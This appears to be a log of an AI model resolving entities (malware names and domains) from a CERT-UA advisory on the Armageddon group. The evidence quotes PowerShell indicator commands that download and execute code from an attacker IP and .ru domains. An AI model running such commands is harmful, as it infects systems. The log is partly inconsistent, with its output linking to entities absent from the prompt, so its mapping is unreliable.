=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
M24. "metanat.ru" (Domain) — options: E45, E68, E53, E39
M25. "mitlubald.ru" (Domain) — options: E36, E78, E39, E45
M26. "paparat.ru" (Domain) — options: E64, E68, E90, E39 — ctx: S5
M27. "pasamart.ru" (Domain) — options: E36, E37, E84, E39
M28. "qkcew.ru" (Domain) — options: E39, E37, E92, E36
M29. "rncsq.ru" (Domain) — options: E39, E37, E94, E43
M30. "tarlit.ru" (Domain) — options: E46, E68, E39, E36
M31. "tbwelo.ru" (Domain) — options: E36, E37, E44, E39
M32. "wicksl.ru" (Domain) — options: E52, E37, E74, E39
M33. "xcqef.ru" (Domain) — options: E43, E37, E79, E39
M34. "nxkad.ru" (Domain) — options: E43, E93, E78, E39 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E98, E99, E100, E80
M36. "tools.nexcess.net" (Domain) — options: E106, E107, E108, E109
M37. "viewdns.info" (Domain) — options: E98, E105, E108, E115
M38. "www.portcheckers.com" (Domain) — options: E120, E121, E50, E101 — ctx: S7

=== RESPONSE (5.3s, in 4400 / out 735 tok, STOP) ===
{"m":"M1","id":"NEW","g":"PowerShell-based malware used for file and browser credential theft"}
{"m":"M2","id":"NEW","g":".NET-based malware used for browser credential theft"}
{"m":"M3","id":"NEW","g":"previously used malware related to GammaSteel.PS1"}
{"m":"M4","id":"E24","g":null}
{"m":"M5","id":"NEW","g":"subdomain indicator of compromise"}
{"m":"M6","id":"NEW","g":"domain indicator of compromise"}
{"m":"M7","id":"NEW","g":"domain indicator of compromise"}
{"m":"M8","id":"NEW","g":"domain indicator of compromise"}
{"m":"M9","id":"NEW","g":"domain indicator of compromise"}
{"m":"M10","id":"NEW","g":"domain indicator of compromise"}
{"m":"M11","id":"NEW","g":"domain indicator of compromise"}
{"m":"M12","id":"NEW","g":"domain indicator of compromise"}
{"m":"M13","id":"NEW","g":"domain indicator of compromise"}
{"m":"M14","id":"NEW","g":"domain indicator of compromise"}
{"m":"M15","id":"NEW","g":"domain indicator of compromise"}
{"m":"M16","id":"NEW","g":"domain indicator of compromise"}
{"m":"M17","id":"NEW","g":"domain indicator of compromise"}
{"m":"M18","id":"NEW","g":"domain indicator of compromise"}
{"m":"M19","id":"NEW","g":"domain indicator of compromise"}
{"m":"M20","id":"NEW","g":"domain indicator of compromise"}
{"m":"M21","id":"NEW","g":"domain indicator of compromise"}
{"m":"M22","id":"NEW","g":"domain indicator of compromise"}
{"m":"M23","id":"NEW","g":"domain indicator of compromise"}
{"m":"M24","id":"NEW","g":"domain indicator of compromise"}
{"m":"M25","id":"NEW","g":"domain indicator of compromise"}
{"m":"M26","id":"NEW","g":"domain indicator of compromise"}
{"m":"M27","id":"NEW","g":"domain indicator of compromise"}
{"m":"M28","id":"NEW","g":"domain indicator of compromise"}
{"m":"M29","id":"NEW","g":"domain indicator of compromise"}
{"m":"M30","id":"NEW","g":"domain indicator of compromise"}
{"m":"M31","id":"NEW","g":"domain indicator of compromise"}
{"m":"M32","id":"NEW","g":"domain indicator of compromise"}
{"m":"M33","id":"NEW","g":"domain indicator of compromise"}
{"m":"M34","id":"NEW","g":"domain indicator of compromise"}
{"m":"M35","id":"NEW","g":"network lookup service domain indicator"}
{"m":"M36","id":"NEW","g":"network tool domain indicator"}
{"m":"M37","id":"NEW","g":"DNS lookup service domain indicator"}
{"m":"M38","id":"NEW","g":"port checking service domain indicator"}
